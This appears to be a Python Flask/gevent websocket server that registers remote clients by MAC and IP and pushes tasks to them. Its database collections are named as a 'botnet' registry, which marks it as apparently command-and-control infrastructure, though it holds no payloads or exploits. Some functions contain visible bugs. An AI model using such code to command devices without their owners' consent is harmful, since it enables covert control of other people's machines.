
# import gevent
# from gevent import monkey
# monkey.patch_all()

import os
import sys
import time
import json
from pdb import set_trace as strace
from traceback  import format_exc as dumpstack
import functools,threading
import contextlib

# sys.path.append(os.path.dirname(__file__) + "/..")
from common           import util
from celerys.wsapp    import WebsocketCeleryApp
from common.mongo     import db_botnet_registers,db_botnet_connects,db_startups,db_botnet_clients
from common.utilredis import NewID
from common.utilcache import ConnCache,MacCache

class TaskWS():

    def __init__(self, uid, ws=None, payload={}):

        self.payload = payload
        self.ws = ws
        self.uid = uid
        self.timeout = 5
        self.init()

    def init(self):

        self.tid   = NewID.task
        if not self.tid: return
        self.payload["tid"] = self.tid
        if not isinstance(self.payload, dict):
            self.payload = json.loads(self.payload)

        # util.log("初始化任务 ", self.tid, level="warn")

        from gevent.queue import Queue
        # from queue import Queue
        self.queue = Queue()

    def push(self, ret):
        # 推送任务结果
        # util.log("开始推送任务结果: ", self.tid, ret, id(self.queue), level="warn")
        if self.tid:
            self.queue.put(ret)

    def pull(self):
        # 拉取任务结果
        if not self.tid:
            return None
        # 5s 内不返回，就别回来了
        import gevent

        # util.log("任务结果: ", id(self.queue), level="warn")
        # gevent.sleep(0)
        # msg = self.queue.get(block=False, timeout=self.timeout)
        msg = self.queue.get(timeout=self.timeout)
        return msg

    def __str__(self):
        return json.dumps(self.payload)

class SessionWS():
    # tasks = {}
    def __init__(self, uid, ws=None):
        self.tasks = {}
        self.uid = uid
        self.ws  = ws

    def run(self):
        ret = self.ws.receive()
        if not ret:
            return
        # util.log("run 收到了 {}".format(ret) , level="warn")
        task = self.get_task(ret)
        if task:
            task.push(ret)

    def init_task(self, payload={}):
        task = TaskWS(self.uid, self.ws, payload)
        self.tasks[task.tid] = task
        return task

    def get_task(self, payload):
        # task = TaskWS(self.uid, self.ws, payload)
        data = json.loads(payload)

        if "tid" in data:
            return self.tasks[ data["tid"] ]

    def send_task(self, task):
        self.send(str(task))

    def send(self, msg):
        if not isinstance(msg, str):
            msg = json.dumps(msg)
        # elif not isinstance(msg, )
        msg = msg.encode()
        self.ws.send(msg)

    def send_ok(self):
        self.send({"code":200, "tid":0})

    def send_error_re_online(self):
        """
        423 Locked (WebDAV)
            正在访问的资源已锁定。
        """
        self.send({"code":423, "tid":0, "msg": "设备不可重复上线"})

    def __bool__(self):
        return not self.ws.closed

    def clear(self, task):
        tid = task.tid
        if tid in self.tasks:
            del self.tasks[tid]

    def close(self):
        self.ws.close()
        del self.tasks

class WSPOOL():
    sessions = {}
    def __init__(self):
        pass

    def broadcast(self, msg, roomid=None):
        for uid in sessions:
            self.emit(msg, uid)

    def emit(self, msg={}, uid=0):
        if not self.ws_exists_and_online(uid):
            util.log(f"{uid} 设备已离线 {WSPOOL.sessions}", level="warn")
            return False

        session = WSPOOL.sessions[uid]
        task = session.init_task(msg)
        session . send_task(task)
        ret = task.pull()
        session.clear(task)
        return ret

    def ws_exists_and_online(self, uid):
        return uid in WSPOOL.sessions and bool(WSPOOL.sessions[uid])

    def online(self, uid, ws=None):
        session = SessionWS(uid, ws)
        if self.ws_exists_and_online(uid):
            # util.log(f"[{os.getpid()}] 设备 {uid} 已上线，不能重复连接 {WSPOOL.sessions}", level="warn")
            self.send_error_re_online()
            return False

        cache = ConnCache(uid)
        cache.set(id=uid, uptime=util.now(), time=time.time())

        WSPOOL.sessions[uid] = session
        session.send_ok()
        util.log(f"上线 {uid}", level="warn")
        return session

    def offline(self, uid):
        util.log(f"离线 {uid}", level="warn")
        WSPOOL.sessions[uid].close()
        del WSPOOL.sessions[uid]
        return True

    @contextlib.contextmanager
    def __call__(self, uid, ws):
        s = self.online(uid, ws)
        yield s
        self.offline(uid)

    # def __enter__(self):
    #     pass

    # def __exit__(self, exceptionType, exceptionVal, trace):
    #     pass

def threaded(function):
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        # kwargs["event"] = threading.Event()
        thread_or_process = threading.Thread(target=function, args=args, kwargs=kwargs)
        thread_or_process.setName(function.__name__ + str(time.time()))
        # thread_or_process.event = kwargs["event"]
        thread_or_process.daemon = True
        thread_or_process.start()
        return thread_or_process
    return _threaded

# globals()["__count__"] = 0

@WebsocketCeleryApp()
def _emit(msg, uid=0):
    # util.log(f"[{os.getpid()}] {WSPOOL.sessions}", level="warn")
    pool = WSPOOL()
    ret = pool.emit(msg, uid)
    return ret

def emit(msg, uid=0, timeout=5):
    return _emit.apply_async((msg, uid), queue="ws").get(timeout=timeout)

@WebsocketCeleryApp()
def _broadcast(msg, roomid=0):
    pool = WSPOOL()
    ret = pool.emit(msg, uid)
    return None

def broadcast(msg, uid=0, timeout=1):
    return _broadcast.apply_async((msg, uid), ignore_result=True, queue="ws") # .get(timeout=timeout)

def timestamp():
    # now = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
    return {
        "date": util.now(),
        "ts"  : time.time(),
    }

def get_uid_by_info(ip, mac):
    import binascii
    crc = binascii.crc32("".join([ip, mac]).encode())
    return int(crc)

def get_client_id(ip, mac):

    mac = mac.lower()
    cache = MacCache(mac)

    # ret = redis_botnet_clients[mac]
    if cache.exists():
        # if not redis_botnet_clients[ret["id"]]:
        #     redis_botnet_clients[ret["id"]] = redis_botnet_clients[mac]
        cache.uptime = util.now()
        return int(cache.id)

    uid = get_uid_by_info(ip, mac)
    cache.set(id=uid, mac=mac, ip=ip, uptime=util.now(), time=time.time())

    conn = ConnCache(uid)
    conn.set(mac=mac, ip=ip)

    # info = timestamp()
    # info.update({
    #     "id" : uid,
    #     "mac": mac,
    #     "ip" : ip,
    #     })

    # # robots.robot.notifyme.delay(title="【botnet】新设备注册通知", text=info)

    # redis_botnet_clients[mac] = info
    # redis_botnet_clients[uid] = info

    return uid

# @threaded
def create_ws_server():
    import gevent
    # from gevent import monkey
    # monkey.patch_all()

    from gevent import pywsgi
    from geventwebsocket.handler import WebSocketHandler
    # from werkzeug.middleware.proxy_fix import ProxyFix
    # import geventwebsocket.exceptions
    from flask          import Flask,request
    # from flask_cors     import CORS
    from flask_sockets  import Sockets

    application = Flask(__name__)

    # CORS(application, supports_credentials=True)

    # application.wsgi_app = ProxyFix(application.wsgi_app, x_proto=1)
    # application.config['SECRET_KEY'] = "e4ting"
    pool = WSPOOL()

    @application.errorhandler(404)
    def page_404(error):
        util.log(f'''{request.url} {request.headers["X-Real-Ip"]}''', level="warn")
        return "", 404

    @application.errorhandler(Exception)
    def page_500(error):
        util.log(dumpstack(), level="warn")
        return """{"code":500}""", 500

    # globals()["_api_"] = Api(application)
    _sockets_ = Sockets(application)

    util.log('/api/v3/socket/<int:uid>', level="warn")

    @_sockets_.route('/api/v3/socket/<int:uid>')
    def wsenter_v3(ws, uid=None):
        with pool(uid, ws) as s:
            while bool(s):
                gevent.sleep(0)
                s.run()

    @application.route('/api/v1/socket/client/<string:mac>')
    @application.route('/api/v2/socket/client/<string:mac>')
    def register(mac=None):

        ip   = request.headers["X-Real-Ip"]
        # util.log(mac, request.headers)
        util.log(mac)

        if not util.valid_check(mac):
            return json.dumps({
                "code" : 400,
                "data" : "参数不合法"
            }),400
        uid  = get_client_id(ip, mac)
        data = timestamp()
        data["uid"] = uid
        data["ip"] = ip
        data["mac"] = mac

        from common.mongo       import db_botnet_registers
        db_botnet_registers[time.time()] = data
        return json.dumps({
                "code" : 200,
                "data" : uid
            })

    util.log('/api/v1/socket/conn/<int:uid>', level="warn")
    util.log('/api/v2/socket/conn/<int:uid>', level="warn")
    util.log('/api/v1/socket/client/<int:uid>', level="warn")
    util.log('/api/v2/socket/client/<int:uid>', level="warn")

    @_sockets_.route('/api/v1/socket/conn/<int:uid>')  # 指定路由
    @_sockets_.route('/api/v2/socket/conn/<int:uid>')
    def wsenter_v2(ws, uid=None):
        with pool(uid, ws) as s:
            while bool(s):
                gevent.sleep(0)
                s.run()

    server = pywsgi.WSGIServer(('0.0.0.0', 80), application, handler_class=WebSocketHandler)
    server.start()
    util.log('启动服务成功', level="warn")
    # server.serve_forever()
    # return True

if os.getenv("app") == "ws":
    create_ws_server()

# @WebsocketCeleryApp()
# def _start_ws():
#     util.log("启动ws服务器", level="warn")
#     create_ws_server()
#     return True

# def start_ws():
#     return _start_ws.delay().get(timeout=5)
